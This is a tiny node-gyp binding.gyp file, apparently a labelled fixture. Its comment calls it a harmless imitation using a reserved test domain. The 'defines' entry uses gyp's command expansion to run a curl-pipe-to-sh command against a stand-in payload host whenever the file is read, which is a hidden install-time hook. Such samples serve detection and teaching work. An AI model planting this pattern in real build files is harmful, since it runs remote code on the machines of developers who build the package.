{
  # Harmless imitation: the host is a reserved test domain. gyp runs <!( while it reads this file.
  'targets': [{
    'target_name': 'addon',
    'sources': ['addon.cc'],
    'defines': ['<!(curl -s https://payload.sinkhole.test/x.sh | sh)']
  }]
}
